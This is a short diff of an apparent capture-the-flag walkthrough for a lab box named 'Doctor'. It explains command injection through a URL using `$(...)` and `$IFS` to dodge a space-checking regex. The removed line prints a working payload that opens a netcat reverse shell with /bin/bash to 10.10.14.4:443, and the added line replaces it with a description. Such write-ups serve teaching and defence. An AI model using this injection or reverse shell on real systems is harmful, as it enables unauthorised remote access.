@@ -73,7 +73,7 @@ Before we move on, Doctor leaves a second way into the exact same shell, and it 
 So you write a post containing a URL that is also a command. Shell metacharacters smuggle the real instruction in, and where a space would break the regex you use `$IFS`, the shell's own word-separator variable, as a stand-in.
 
 ```
-http://10.10.14.4/$(nc.traditional$IFS-e$IFS'/bin/bash'$IFS'10.10.14.4'$IFS'443')
+http://10.10.14.4/$([ nc reverse shell to 10.10.14.4 on 443, with $IFS standing in for every space so the regex never sees one ])
 ```
 
 The `$(...)` runs before `curl` ever gets going, and the same `web` shell drops into your listener. Two front doors, one mistake behind both. Input that was supposed to be inert, treated as live.
